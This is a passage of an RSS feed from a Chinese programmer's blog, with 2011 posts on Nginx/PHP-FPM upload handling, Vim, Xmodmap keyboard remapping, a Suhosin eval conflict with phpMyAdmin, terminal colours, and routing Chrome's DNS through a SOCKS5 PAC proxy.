class="code"><p>upload_max_filesize<br />post_max_size<br />memory_limit</p></blockquote><p>也就是接收 POST 时、php 文件运行第一行代码之前，PHP 要一直运行，并占用内存。</p><p>而“新”（新是相对的，实际上两年前就有了）的方式是，Nginx 如果接收的 POST 超过指定大小，则将 POST 内容存成文件，发给 PHP-FPM 的时候，给的是 POST 的文件路径而非内容。</p><p>我对这种方式期盼已久，不但解放了 <span class="monospace">memory_limit</span>（可惜 <span class="monospace">post_max_size</span> 没有一并解决），同时在效率上，明白 <span class="monospace">md5_file($file)</span> 和 <span class="monospace">md5(file_get_contents($file))</span> 之间差异的都能明白这个</p><p>当刚有这种方式的时候，Nginx 和 FPM 都还不够“正式”，在二者都已经稳定的今天，这种方式似乎没得到应有的普及。要知道，这跟 PHP 程序没关系，只要版本够，在 nginx conf 里简单设置一下就可以享受这福利了</p><h2>用 // 取代 http://</h2><p>在偶尔看扫了一眼 wikipedia.org 的源文件时，发现他没有 <span class="monospace">http://</span> 而全是 <span class="monospace">//</span></p><p>经过几天测试，发现 <span class="monospace">//</span> 没有任何兼容性问题，不管是 &#60;a href、&#60;img src、&#60;link href、&#60;script src 或者 CSS 里，甚至 &#60;base target 里，都没有任何影响。跟完整的 <span class="monospace">http://</span> 无异</p><p>今天特意装了个 XP SP3，用 IE 6 试了一下，也能认。但我不清楚为何这么多年，这种写法没有得到普及。只能偶尔见到。</p><p>当然区别是有的，<span class="monospace">//</span> 的语境取决于页面本身，如果你的页面是 <span class="monospace">https</span> 的，那 <span class="monospace">//</span> 就相当于 <span class="monospace">https://</span>，我非但不觉得这是个问题，反而认为这能简化问题，比方说当你的页面可以同时兼容 http 和 https 访问的时候，不用在 HTML 模板上操太多心了。</p><p><img src="http://rss.soulogic.com/track/421" /></p>]]></description></item>
<item><title>程序式编辑程序</title><link>https://soulogic.com/archives/420</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>soulogic.blog.420</guid><pubDate>Sat, 26 Nov 2011 20:26:21 +0800</pubDate><description><![CDATA[<p>如果你没明白这个我自造的词组的话，那听我慢慢解释。另外我只用过 Vim，但我相信 Emacs 必然也是如此，下文所有的“其他编辑器”都是指“Emacs/Vim之外的所有其他编辑器”</p><p>曾经有一个朋友，属于微软系的，入选过微软中国区 MVP，有一次他问我，Vim 到底是个什么样的东西。我对 Vim 一直是三脚猫的水平（到现在也是），我说，这玩意的学习曲线几乎是垂直的，非常难上手，但是很强大，把常见操作都“宏”化了，比方说 dd 是删除一行，fa 是光标挪到下一个字母 a 的位置，而 dfa 就是删掉从当前光标到下一个字母 a 之间的所有内容。他“哦”了一下。但我自己也没法更好的解释 Vim 到底好在哪里了。</p><p>前些日子，看到一篇文章<a href="http://www.aqee.net/coder-or-clown/">《程序员？还是小丑？》</a>，里面第一个段子是，打印 10 个 hello，结果小丑写了 10 行 <span class="monospace">print &#34;hello&#34;</span>。有人在回复里打趣</p><blockquote><p>或许第一个小丑用的是Vim，我相信任何编程语言的for循环都不会简单过vim的yy10p的。</p></blockquote><p>或者是 Y10p</p><p>确实，在那些回复里看到的唯一一个更短的是 Python 的 <span class="monospace">print “hello ” * 10</span></p><p>但同时我意识到，这是一个 Vim 跟其他编辑器最主要的差别。如果是更复杂的操作，你可以在任何编辑器里录制一个宏，然后重复，但是对于这么一个简单的操作，其他编辑器里很难用同样如此简洁的输入来达到同样的效果。比方说你可以复制当前行然后粘帖10遍，但是，在Vim里，“10”这个数字是作为参数来输入的，而 Y 和 p 组合后就类似于 PHP 里的 <a href="http://php.net/manual/en/function.str-repeat.php">str_repeat</a> 函数。</p><p>所谓“程序式编辑”，就是把 Vim 的编辑方式看成是一种语言，把每个操作都看成函数或者关键词，所有操作合在一起看成是一段用来生成程序的程序。这就是 Vim 跟其他编辑器的根本差别。</p><p>这同时也解释了为什么 Vim 难学：作为成生程序的程序，就需要尽可能的简短（如果命名都用 Java 的方式，那必然生成用的程序会比成生后的程序更长，那还不如直接书写最终程序本身了），所以函数都使用一两个字母来命名……这就必然导致了难学难记：这门语言需要你记住几十个函数，每个函数都只用一两个字母命名，而所有操作组合起来就像一段被混淆过的代码，你很难通过读混淆过的代码来学习程序（也就是看别人用 Vim 的方式），所以几乎是唯一的出路就只有硬背函数名，并尝试自己组合运用这些函数。这还不包括 Vim 的配置文件本身也用的是图灵完备的语言。</p><p>我之前最大的问题就是没搞明白这个本质性的差别，所以在 UltraEdit 上耽误了这么多年，2011 快过去了，今年最大的收获就是开始入门 Vim 和 Git，同时也有点悔，如果早两年这样就好了。</p><p>这个世界上有大量的编辑器，常见的、拥有大量用户的也不下十余种，我之前接触的论调都是说 Vim 或者 Emacs 具有无限扩展的能力，其实编辑器发展到今天，差不多该有的功能都有了，别说什么代码高亮文件跟踪自动完成正则替换，就算插件啊宏啊内置脚本语言啊，也都有，差也差不到哪去。而且很多都有独门的绝活，像下图中 <a href="http://www.sublimetext.com/">Sublime Text</a> 可以显示整篇代码的缩略图，就必须是原生 GUI 才能实现的功能，内置语言再高级也没用。</p><p><a href="http://www.sublimetext.com/"><img src="https://soulogic.com/upload/133" /></a></p><p>但唯独这编辑方式，是刻在骨子里的。如果不是见识了 Vim 的极致的高效，我也无法理解不单是纯键盘输入，连方向键都要用字母键代替。对待这个基本问题，要么是像 Vim 用模式来区分，要么像 Emacs 一样用组合键来区分，再无更好的方法。其他功能都只是锦上添花。</p><p>所以这个世界上编辑器只有三种，Emacs、Vim，和其他。或者说，编辑程序的方式有两种，程序式编辑程序，和文本式编辑程序。</p><p><img src="http://rss.soulogic.com/track/420" /></p>]]></description></item>
<item><title>关于热键和键盘布局</title><link>https://soulogic.com/archives/419</link><author>zhengkai@gmail.com (郑凯)</author><category>铂 Platinum</category><guid>soulogic.blog.419</guid><pubDate>Sat, 26 Nov 2011 17:49:08 +0800</pubDate><description><![CDATA[<p>先从热键说起吧，最开始沉迷的是 Quake 3。大部分的参数（原始版本大概有三四百个，一些 MOD 诸如 OSP 将参数数目扩充到了 1K+）是需要自己改配置文件的。虽然参数系统不是图灵完备的，但能做的事情也还算多了，比方可以让右键的瞄准视角符合 CS 风格，这并不是一个参数说让你选择哪种风格，而是需要有个临时变量来保证按一下开瞄准，同时改变视角的度数，再按一下关上。还有一个很重要的参数是鼠标灵敏度，对于不同的武器热键需要不同的灵敏度，一个真正的 Quaker 会花很多时间去微调每把武器的灵敏度，以达到一个最佳状态，这是起码的要求。而分享各自的 config 就像现在晒 github 一样流行。</p><p>让我开始注意到热键的重要性，是当时有人举了个例子，假设行走是用的 ASDF（也有SDFE的，同理），一般会在最近的两个键 Q 和 E 上绑着非常重要的功能，很有可能就是武器切换，但是，当你斜跳的时候，你没法让三个手指都在一侧，比方说你按 A、W、空格三个键跳起时，你是没法按 Q 的，如果你要换武器，通常都是 E。据说有顶级选手之间可以通过钻研对手的 config 而在比赛中获得更多的优势——只是据说，但我相信那些疯子能做到。</p><p>在 WOW 里，由于技能系统过于复杂，我花费了非常多的时间来调整热键和界面。记得暴雪的某人说，有无数人提议做游戏主机版的 WOW，可他们做不到，如果有谁做到了，准能发大财。我想其中的关键因素就是操控，虽然我定义了一半以的字母键，外加一些组合键盘，还有罗技 MX518 鼠标的两个拇指键和滚轮也有所安排，在 RAID 时还是觉得键位紧张，而不时不让某些不常用的操作靠鼠标点界面来解决。而且，有些按键是绑定的脚本，而非游戏本身的单一功能。</p><p>打造一套完全个人定制的热键是历来的习惯，并且这是很有趣的事情。只可惜直到最近，我才想到 Linux 的高度可定制。不过在此之前还是想先说下键盘本身。</p><p>根源是我得知有一种叫 HHKB（Happy Hacking Keyboard）的键盘，有着非常怪异的布局：</p><p><img src="https://soulogic.com/upload/131" /></p><p>当然，看到后我还是迅速接受了这种布局：只有主键盘区 / 去掉了 F1 - F12 / 数字 1 左边的 ` 改为 Esc / 大小写切换改为 Ctrl 键。很明显这些改动非常适合 Emacs/Vim 用户，同时也引发了我对键盘布局的思考。很明显 Ctrl 就应该是在那个位置上的，却一直熟视无睹，而 ` 键在 WOW 里我一直给设成非常重要的热键，却没有想过在游戏之外也应该重用这个键。</p><p>很明显，更改这些键并不需要特制的昂贵硬件来实现，我没有去研究 Windows 下如何设置（大概 AutoHotKey 可以做到？），问了下刘涛，起码在 Linux 下是很简单的，直接用 Xmodmap 就可以，比方说在其 man 里，就已经说明了如何对调 Ctrl 和 Caps Lock：</p><blockquote class="code"><p>remove Lock = Caps_Lock<br />remove Control = Control_L<br />keysym Control_L = Caps_Lock<br />keysym Caps_Lock = Control_L<br />add Lock = Caps_Lock<br />add Control = Control_L</p></blockquote><p>只要写到 ~/.Xmodmap 里就可以自动生效了。</p><p>而对于 ` 的问题，我没有挪成 Esc，而是额外绑了个多媒体键 XF86Search，作为呼叫 Tilda 的热键（一个仿 Quake 控制台的 Terminal，类似的软件还有很多，如 Guake、Yakuake、Mac 下的 Visor），如果要输入原本的 `，要用右 Alt 键。同时并不妨碍 Shift + ` 来输入 ~。另外，要去掉系统里默认的针对 XF86Search 的热键。最终配置是这两行：</p><blockquote class="code"><p>keycode &#160;49 = XF86Search asciitilde<br />keycode 108 = grave asciitilde</p></blockquote><p>另外，在获知这些内容的时候，正在寻莫一个趁手的机械键盘，而乔伦和刘涛两三年前就在用 Cherry 原厂了。入门级产品里有乔伦推荐的 PLU 87，加之新蛋上看到的 Flico 87 和 RealForce 87，这几款顾名思义都是没有数字键区的，但最终还是找了自己理想的键盘：Noppoo Mini。</p><p><img src="https://soulogic.com/upload/132" /></p><p>虽然想不通一个游戏外设品牌为什么会做出这么仿 HHKB 的形状来讨好 Geek，甚至在右上角还有个一个专门的键来切换 Ctrl / Caps Lock，看到一些国外的测评里，也拿这款键盘作为一个廉价版 HHKB 看待（主要的价格差别在于，HHKB 是电容键盘，相比机械键盘要高档不少）。但相比 HHKB，多了上面和右边的两排键显然更适合我等凡人。不过对我个人而言，右侧的两个键 Page Up / Page Down，加上 Fn 组合键后才是 Home / End，我希望对调一下，默认是 Home / End，那么 Xmodmap 里可以这么设</p><blockquote class="code"><p>keycode 112 = Home<br />keycode 117 = End</p><p>keycode 110 = Prior<br />keycode 115 = Next</p></blockquote><p>这么做还是有必要的，比方说网页的文字框里你没法像 shell 下那样用 Ctrl A / Ctrl D</p><p>键盘入手一个多月来，除了几乎每天都要感叹几次机械键盘打字爽外，对 Ctrl 的适应性超快，大概入手一两天就习以为常了，就好像 Ctrl 键从来都是在那个位置上一样，直到有一天在 Wiki 上看到，<a href="http://en.wikipedia.org/wiki/Vi">Vi 的页面上甚至有一张专门的 ADM3A 键盘布局</a>来解释 Esc 键和 HJKL 移动的问题，这也顺便解释了 Ctrl 的问题。此外，还搜到一篇<a href="http://kung.in/archives/1416">《Vi/Emacs & 键盘史》</a>，列举了很多照片来说明 Ctrl 的问题（也靠里面的图片确认了 RMS 真的在用 HHKB），可想而知，现在的 Ctrl / Caps Lock 的布局的问题是 104 键盘推广的结果，其更适合文秘而非程序员。我是主张所有程序员都应该对调这两个键。</p><p><span style="font-weight: bold; font-family: '微软雅黑'">Update in 2011.12.05</span></p><p>我就觉得好像忘了点什么，注意看 <a href="http://en.wikipedia.org/wiki/Apple_II_series">Apple ][ 的 wiki</a> 里的照片，所有键盘都是 Ctrl 在左中哦</p><p><img src="http://rss.soulogic.com/track/419" /></p>]]></description></item>
<item><title>读《黑客与画家》</title><link>https://soulogic.com/archives/418</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>soulogic.blog.418</guid><pubDate>Sun, 09 Oct 2011 04:14:53 +0800</pubDate><description><![CDATA[<p>其实<a href="http://www.ruanyifeng.com/docs/pg/">《黑客与画家》</a>是提前预订的，所以一发售就看了，但现在才动手写读后感，实在是因为回味无穷。</p><p>这本随笔集包含了很多观点，对我而言最重要那部分，就是押题的那段：真正的程序员跟画家是如此相似。其实我以前也有类似的<a href="https://soulogic.com/archives/376">模糊印象</a>，但一直没法说清楚：</p><blockquote><p>额外的一个话题，我发现很多人都在 Google Profile 上都写着职业 Engineer。我总觉得，写 Engineer 和写 Programmer 的，代表着两种完全不同的态度。</p></blockquote><p>作者 Paul Graham 一直强调快速创造原型，顺便狂热鼓吹 Lisp，先说我理解的第一层意思，语言对于开发效率的影响。</p><p>虽然大家所用的语言都是图灵完备的，且不说能不能把函数作为返回值这类高级货，单看拿 Java 的 syntax 作为靶子，确实惨不忍睹，明明都表达同一个意思，却要多写那么多的冗余关键字，这里要强调一个概念，香农的信息熵，以前我能明白这么个概念但一直不知道是什么词（最早想到这个问题是用来解释为什么 mp3 和 zip 是不同的压缩方式，但 mp3 已经无法被 zip 进一步压缩了），后来在谷歌黑板报的几篇数学之美系列的文章里得以窥豹，例如 <a href="http://www.googlechinablog.com/2007/12/blog-post.html">输入一个汉字需要敲多少个键</a>，比方说如果所有 method 都必须有范围，那最常见的 public 完全可以省略掉，虽然程序语言可以类比为自然语言，但也可以类比成都要输入汉字时，不同语言相当与不同输入法。很多动态语言的书写效率是五笔的话，基本上 Java 就是全拼了……但是 Paul Graham 宣扬的代码长度跟开发效率等比显然是歪理邪说了，虽然有特例，例如39年德国在欧洲的征服速度约等于行军速度，但放到42年的斯大林格勒就不是这样了。大家应该都碰到过这种情况：区区两三百行代码被反反复复写了好几天，还是两三百行，只不过不是之前的两三百行了。</p><p>跟 Java 的 syntax 一样傻的，还有 DOS 换行符，虽然这可能是历史原因，干出这事的人可能有理由不被责备，但 <span class="monospace">\r\n</span> 换行符确实很傻，就像没人会在写字的时候，把“句号”写成“逗号句号”。所有现代语言（就是除了 Java 之外我们常见到的）都在降低代码的信息熵，说白点就是如何在保证不产生歧义的情况下尽量减少各种符号。其实 <span class="monospace">;\n</span> 跟 <span class="monospace">\r\n</span> 差不多傻，所以所有现代语言（就是除了 Java 和 PHP 之外我们常见到的）都把分号去掉了</p><p>第二层意思，语言的适用性</p><p>其实 Paul Graham 已经在一个不起眼的注释里，借其搭档之口间接的表达了这个意思：智力是分阶级的，而不同语言归属于不同阶级（这个理念属于书中《不能说的话》里说指的那类东西）</p><blockquote><p>（中文版 P173 注释）<br />莫里斯觉得不用这么保密，因为即使竞争对手知道我们使用 Lisp 语言，对他们也不会有帮助：“如果他们真的聪明，早就已经在用 Lisp 编程了”</p></blockquote><p>对于 Viaweb 为什么是用 Lisp 写的，我只能这么解释这个问题：掌握 Lisp 属于智力上的挑战，倚靠 Lisp 的特性来快速开发产品是极少数高智商的人能做到的事情，Lisp 的始创者将其作为数学表达方式，而从来没想过用 Lisp 做这么具体的产品。所以书中引用别人的话，建议黑客了解 Lisp，哪怕未必在实际工作中用到它，其实和<a href="http://home.wangjianshuo.com/cn/20080319_eceee_caee.htm">王建硕对微积分的看法</a>是一样的（人的脑子思考问题，除非经过特别的训练（微积分是训练的一种），都是线性的）。我的看法是，Lisp 绝不适合做开发，就像<a href="http://gaussfacts.com/">高斯</a>的尺规作图十七边形不是你能做的一样。我想象的 Lisp 里大量使用所谓的 macro，可维护性相当于十七边形。</p><hr /><p>PHP 能足够流行，主要原因之一是这语言下贱，我想如果所有语言都能测一下开发者的平均智商的话，应该 PHP 的开发者的平均智商是最低的。但这话绝不是冒犯任何人，想承认他流行就必须承认这是因为连智商 90 的人都敢尝试给 PHP 写 Framework 才能导致这么流行，这是一个事实，跟任何一个具体的使用者是谁、怎么用无关。我在开始了解其他语言后，才知道这么个事实：其他几乎所有语言的基础库，都是用同样的语言写就的，唯独 PHP 的基础库都是靠 C 的。去年看到一片文章说 PHP 不是语言，深表同意，我认为 PHP 的位置实际处于伪代码和程序语言之间，以快和下贱为特色，你可以快速搭建原型，需要人手时可以找一群民工来写，这语言当然就很厉害了。《黑客与画家》给我最大的一个启示就是，尽管我明白优化乃万恶之源，但实际写代码的时候还是容易拘泥于细节，现在看来最痛恨的事情就是在给一个应用做第一版的时候，代码还不够伪代码化。你是程序员，你是画家，你要最快的速度让一个程序能跑起来。画一幅受欢迎的画是程序员要做的，把画印刷成无数分卖往全世界是工程师要做的。真等 facebook 的网站运转起来了，还愁这世界找不到人改进下 memcache 的 pecl 就节省出上万台机器么。</p><p>我之前相信语言争论的和事佬说法：语言各有各的精髓，但总的来说是相等的。Paul Graham 用一个简单的例子来驳斥：如果承认 Perl 5 比 Perl 4 强，那就应该承认不同语言之间也存优劣之分（这种手法我以前也用过，当时用自己一年间的差距来证明合作的困难）。其实以前看<a href="http://book.douban.com/subject/4163938/">《软件随想录》</a>里的一篇<a href="http://www.google.com/#q=%E4%BD%A0%E7%9A%84%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E8%83%BD%E8%BF%99%E6%A0%B7%E5%81%9A%E5%90%97%EF%BC%9F">《你的编程语言能这样做吗？》</a>时就在琢磨这个问题了，看到《黑客与画家》的时候又把这个问题强化重视了。你可以继续用 PHP 去谋生，但不可以不知道在一些语言特性上，PHP 相比 Python 或 Ruby 差的有多么远。</p><hr /><p>（机器换了，发现这篇没备份，是从 google 找回来的，评论没了，sorry）</p><p><img src="http://rss.soulogic.com/track/418" /></p>]]></description></item>
<item><title>Suhosin 禁用 eval 导致 phpMyadmin 冲突一例</title><link>https://soulogic.com/archives/417</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>soulogic.blog.417</guid><pubDate>Fri, 05 Aug 2011 12:03:48 +0800</pubDate><description><![CDATA[<p><a href="http://www.hardened-php.net/suhosin">Suhosin</a> 是个很强的 PHP 安全模块，但一直没怎么实际操练过，今天就露怯了。</p><p>现象很古怪，新下的 phpMyAdmin 默认能看，一配 <span class="monospace">config.inc.php</span> 就报错，哪怕只是 touch 个空文件，最费解的是除了 nginx 报 500 错误外，在 <span class="monospace">error_log</span> 里没有任何显示。</p><p>折腾了半天，突然想到能出这种报错的也许是个特殊模块而不是 PHP 自身，最终定位到是因为在配置里打开了 <span class="monospace">suhosin.executor.disable_eval = on</span>，而 phpMyAdmin 里有 n 多 <span class="monospace">eval</span></p><p>这个问题浪费时间的地方在于，Suhosin 的日志是不输出到 PHP 的 <span class="monospace">error_log</span> 的（很好理解，如果被攻击，<span class="monospace">error_log</span> 也自身难保），而是 syslog，在 Ubuntu 上如果所有软件都是从 apt 装的话，错误信息会留在 <span class="monospace">/var/log/syslog</span>。但搜到的文章里看到还可能在 <span class="monospace">/var/log/messages</span>。不知道在 Ubuntu 上装了 syslog-ng 后会怎样，不过肯定就这两个地方跑不掉了。</p><p>总之以后多了个经验，如果出了 500 后 PHP <span class="monospace">error_log</span> 看不到问题，那就去看看 syslog</p><p>对于 phpMyAdmin，<a href="http://www.php.net/manual/en/ini.sections.php">如果是 PHP 5.3+ 且 CGI/FastCGI 方式运行，可以这么改 php.ini</a>，让 phpMyAdmin 可以破例使用 <span class="monospace">eval</span></p><blockquote class="code"><p>[PATH=/var/www/phpmyadmin/]<br />suhosin.executor.disable_eval = off</p></blockquote><p>其实 Suhosin 的那么多选项，哪怕不用，只是看一遍说明也会大有收获，推荐没用过的都看一下</p><p><img src="http://rss.soulogic.com/track/417" /></p>]]></description></item>
<item><title>直到刚才，我才想明白大家对 PHP 的用法是如此迥异</title><link>https://soulogic.com/archives/416</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>soulogic.blog.416</guid><pubDate>Wed, 03 Aug 2011 12:29:23 +0800</pubDate><description><![CDATA[<p>导致一系列悲剧的起因是，大家的母语不同（当然，我是说程序的母语）。</p><p>对于早期的 PHP 使用者来说，大多数人在接触 PHP 之前都早已熟悉了编程，因此他们在接触 PHP 时，关心的不是 PHP 能干什么、该干什么，而是 PHP 跟他之前掌握的语言有何不同、以及怎么消除这种不同。</p><p>例如，Smarty 是最令我疑惑的东西，我完全理解不了为什么要用这种脱裤子放屁的东西，而且想当初模板类有那么多，今天我才明白，基本上是个语言都会有模板类，所以他们在用 PHP 的时候，也理所应当的认为要搞一个，而一直在回避最基本的问题：PHP 是<span style="font-weight: bold; font-family: '微软雅黑'">模板语言</span>。所以他们借助 PHP 实现了另外一套叫 Smarty 的语言。搞得我很自卑，因为我一直不会用 Smarty，所以招人的时候总要问一句“会 Smarty”么，我想的是只要有人会就可以了。</p><p>另外一个东西，我不知道应该单独批判 Controller 还是整个 MVC。当我写了几年 PHP 后，突然大家都开始自己解析 <span class="monospace">$_SERVER[&#34;REQUEST_URI&#34;]</span> 并 require 对应的文件，说这叫统一入口，这事也让我很惊奇。我相信有太多的人碰到过为了加个 google webmaster 的验证文件之类的东西而不得不去改动 PHP 文件的情况，这真是自找。后来我才明白，在很多语言中，整个 web server 都要自己实现的，所以解析 URL 是份内要做的事情。但 PHP 是寄生于 web server 上，本来不需要惦记这个问题，最多借助 web server 的 url writer 是为了美化，而不是为了功能。</p><p>还有一些错误的优化方向，例如有人提议不要使用 <span class="monospace">require_once</span> 而只用 <span class="monospace">requrie</span>，因为前者会增加一个类似 <span class="monospace">in_array()</span> 的操作，这真让人崩溃，也许这种开销在操作系统的内核中会被循环给放大，但是对于 web 开销来说，九牛一毛都谈不上，让 facebook 的程序员在他们代码里这么替换，能省出几台机器？对于你实际的应用，能省出两条内存么？够你一上午的工资么？</p><p>这些扯的远了。鉴于 PHP 各种奇怪的方式使用着，我只能猜想这一现象是映射太多不同语种的程序员对 PHP 的不同理解，很多写过点 C 或 Java 的人用 C 或 Java 的方式写 PHP，并教那些新入行的程序员也以这种方式写 PHP，在他们眼里 PHP 是稍微差一点的 C 或 Java，因为 PHP 还实现不了某些特性，但很少会去想，他们为什么要用 PHP，或许仅仅出于被迫，而不是自己的一种选择？</p><p><img src="http://rss.soulogic.com/track/416" /></p>]]></description></item>
<item><title>关于 Web SQL Database 的失败尝试</title><link>https://soulogic.com/archives/415</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>soulogic.blog.415</guid><pubDate>Thu, 16 Jun 2011 19:21:32 +0800</pubDate><description><![CDATA[<p>离线存储通常是存文本数据，最典型的例子当属 Gmail 的邮件，作为一个失败的尝试，这两天的成果就是一个结论：可以用离线存储存图片，但是性能太差，写完之后用 iPod Touch 3 一跑，感觉自己写的不是 demo，而是 benchmark。</p><p>演示页面在 <a href="http://soulogic.com/lab/201106/websqlimage/">http://soulogic.com/lab/201106/websqlimage/</a></p><p>想法是这样：所有图片标签没有 src 属性，而有一个等值的 psrc 属性，用 JS 扫描所有的 img 标签，以 psrc 作为 key 来查询是否存有该图片（data:base64 格式的），有就直接赋值到 src，没有则 src = psrc，并且下个钩子，在图片读完后把图片内容的 base64 存到 web sql database 里。</p><p>这么傻的处理方式有两个原因：1.让现有的众多网页尽可能小的做改动，2.其实这事 expires max 就够了，但手持终端里浏览器到底能分配多少 cache 实在很难说，而很多高质量图片（例如游戏材质）实在经不起太多次加载，现阶段的国情是要考虑流量。</p><p>失败的原因是让 touch 3 里 Safari 再跑个 sqlite 来处理这事，非常卡，有一次由于图片太多太大，直接把 Safari 卡没了。尽管在 PC 上的 Chrome 跑起来还好，尽管如果能用 JS 控制图片缓存是个很美妙的事情，尽管用这种方法存图片连 Ctrl + F5 都不会重新加载图片</p><p>把图片转成 data:base64 格式要用到 canvas，但试了几下也没找到 <a href="http://dev.w3.org/html5/canvas-api/canvas-2d-api.html#dom-imagedata-height">interface ImageData 的宽高属性</a>——我要用这个来找到图片的原始宽高（对应 iPhone 4 的视网膜屏，通常需要用 CSS 让图片缩小一半，这样才能让图片的像素跟硬件分辨率对应上），但不想花时间去研究是浏览器支持问题还是我的用法问题，直接用了一个 12 年前的古老技巧复制 src 来回避了</p><p><img src="https://soulogic.com/upload/130" /></p><p>但无论如何算是对<a href="http://www.html5rocks.com/en/features/storage">离线存储</a>有些概念了，恶补了现代 JS 满世界挂 callback 的使用方法，以及第一次了解 sqlite（以前真没碰过）</p><p>现在的浏览器已经有意思得多，而且跟以前不同的是，现在大部分功能已经不仅仅是概念演示了，而是<span style="font-weight: bold; font-family: '微软雅黑'">真的能用</span>。据说 Firefox 小组自称他们最棒的作品是 IE 7（导致了它的出现），那可以说 Chrome 对这个世界最大的贡献不是 V8，而是 Chrome 这个版本升级癖让所有的浏览器都开始活跃起来、支持新功能</p><p><img src="http://rss.soulogic.com/track/415" /></p>]]></description></item>
<item><title>终端二则</title><link>https://soulogic.com/archives/414</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>soulogic.blog.414</guid><pubDate>Sat, 04 Jun 2011 15:38:25 +0800</pubDate><description><![CDATA[<p>直到上周，我还一直以为终端只能有 16 色……因为当初用 SecureCRT 时，把终端类型挨个试了遍，只有“Linux”默认出来的是黑底，而用&#34;XTerm&#34;默认是白的（因为颜色方案是要自己选的），就给归类成“VT100”那类了。知道前几天才知道可以设成 256 色。只要在 .bashrc 里加这么一段就可以了</p><blockquote class="code"><p>if [ &#34;$TERM&#34; == &#34;xterm&#34; ]; then<br />	export TERM=xterm-256color<br />fi</p></blockquote><p>在 VIM 中，就可以直接用数字颜色代码了，例如背景色不用纯黑而是略微的灰度：</p><blockquote class="code"><p>:hi normal ctermbg=234</p></blockquote><p>也许有人会说 GVIM 可以使用 24位色，但登录各种服务器还得 SSH</p><p>下面这个完整的颜色表出自<a href="http://en.wikipedia.org/wiki/Xterm">http://en.wikipedia.org/wiki/Xterm</a></p><p><img src="https://soulogic.com/upload/127" /></p><p>在 tmux 中，需要在在启动的时候带上参数 <span class="monospace">-2</span>，或者在 <span class="monospace">~/.tmux.conf</span> 中设置</p><blockquote class="code"><p>set -g default-terminal &#34;xterm-256color&#34;</p></blockquote><p>但是颜色不能像 VIM 中那样直接用数字，要在数字前加 <span class="monospace">colour</span></p><p>例如我的状态行配置</p><blockquote class="code"><p>set -g status-left &#34; #[fg=colour123]#H &#34;<br />set -g status-bg colour234<br />set -g status-fg white</p></blockquote><hr /><p>前几天老同事尚北京跟我展示他的一个概念 <a href="http://cmdgame.com/">cmdgame.com</a>，给他提议仿终端的 Web 界面应该使用个等宽字体，突然就想到似乎可以用 <a href="http://www.google.com/webfonts">Google Web Fonts</a>，其中一种 <a href="http://www.google.com/webfonts/family?family=Droid+Sans+Mono">Droid Sans Mono</a>，在 14px 下看着还不错</p><p><a href="http://www.google.com/webfonts/family?family=Droid+Sans+Mono"><img src="https://soulogic.com/upload/129" /></a><br />（由于次像素平滑的原因，不同显示器不同系统可能看这张图片有很大偏差，建议去网站看）</p><p>感觉比我以前桌面用的 <a href="http://dejavu-fonts.org/wiki/Main_Page">DejaVu Sans Mono</a> 更舒服些，仔细比较了一下，DejaVu 的 x-height 略高，显得偏胖，此外 <span class="monospace">g</span> 的写法也不同，我是喜欢 <span class="monospace">a</span> 和 <span class="monospace">g</span> 用印刷体，不是因为好看，是为了便于识别，像 Monaco 我慕名而装，却只用了五分钟就卸掉了，因为 o 和 a 长的太像，容易看花眼。但如果用作程序字体，Droid 有个巨大的瑕疵：数字 0 和字母 O 区分不明显，在找到更好的字体之前，先忍了。</p><p>这种字体也提供 ttf 文件下载供桌面使用，接受募捐，而我可耻的选择了免费下载。用了两年的 DejaVu，就这么被换掉了（更早用的是<a href="https://soulogic.com/archives/310">从 Linux Kernel 里扒出来的，Fixed 16</a>）</p><p><img src="http://rss.soulogic.com/track/414" /></p>]]></description></item>
<item><title>在穿墙时让 Chrome 的 DNS 查询也走 socks5 代理</title><link>https://soulogic.com/archives/413</link><author>zhengkai@gmail.com (郑凯)</author><category>代码 Coding</category><guid>soulogic.blog.413</guid><pubDate>Wed, 20 Apr 2011 18:57:21 +0800</pubDate><description><![CDATA[<p>先说结果，就是如果用的 PAC，把所有 <span class="monospace">SOCKS</span> 替换成 <span class="monospace">SOCKS<span style="font-weight: bold; font-family: '微软雅黑'">5</span></span> 就可以了，例如下面这个 pac 让所有访问都走代理</p><blockquote class="code"><p>function FindProxyForURL() {<br /> &#160; &#160;return &#34;SOCKS5 127.0.0.1:7777&#34;;<br />}</p></blockquote><p>再细说下自己的穿墙过程，一开始是 HTTP proxy 和 Tor 很简单的穿，自从知道了 <a href="http://livid.cn/doc_view.php?doc_id=5744">PAC & SSH</a> 的组合后逐渐开始走火入魔——特别是在会用 autossh 自动重接之后。</p><p>到现在，我的 <span class="monospace">rc.local</span> 里会在 Ubuntu 虚拟机启动后，连上所有我常用的远程主机，其中有若干台还额外带着 <span class="monospace">-L</span> 或 <span class="monospace">-R</span> 参数。SSH 是用来防范所有监听，而不仅仅是 GFW 的，我认为所有 phpMyAdmin 之类的 web 管理工具（包括我的这个新版 blog 的后台）都应该是仅限 <span class="monospace">127.0.0.1</span> 来访问，这应该比没有 SSL 的 Cookie 要安全得多，你不用担心办公室局域网或者机房的网管出于私人爱好而嗅探到什么。</p><p>PAC 文件本身也是个非常美妙的东西，用 JS 脚本做配置文件实在太舒服了，因为 JS 的语言规范超越了所有软件和时间的限制。还有就是就像 Livid 说的</p><blockquote><p>FoxyProxy 很强大，但是有一些问题很麻烦: FoxyProxy 的配置貌似没办法在多台机器之间转移，太多的鼠标操作（这或许不算是个问题, 但是如果能够通过编辑一个文件来实现同样的功能的话会好很多，因为纯文本文件很容易被编辑和复制，并且也很容易放进版本控制系统）。</p></blockquote><p>对于 DNS 走代理的问题，FireFox 的 about:config 有 network.proxy.socks_remote_dns 参数，但 Chrome 下一直没找到什么好的方法，后来想到在 Ubuntu 里再装个 Privoxy，但偏偏 <a href="http://beatricesmth.blog41.fc2.com/blog-entry-93.html">Privoxy 在处理 chunk 的时候有 BUG</a>，而 <a href="http://code.google.com/p/chromium/issues/detail?id=29914">Chrome 又说 SOCKS5 DNS 的问题已经被 fixed</a>，最终在<a href="http://blog.solrex.org/articles/remote-dns-lookup.html">一篇帖子的回复</a>里注意到那个关键的 <span style="font-weight: bold; font-family: '微软雅黑'">5</span> 字</p><p><img 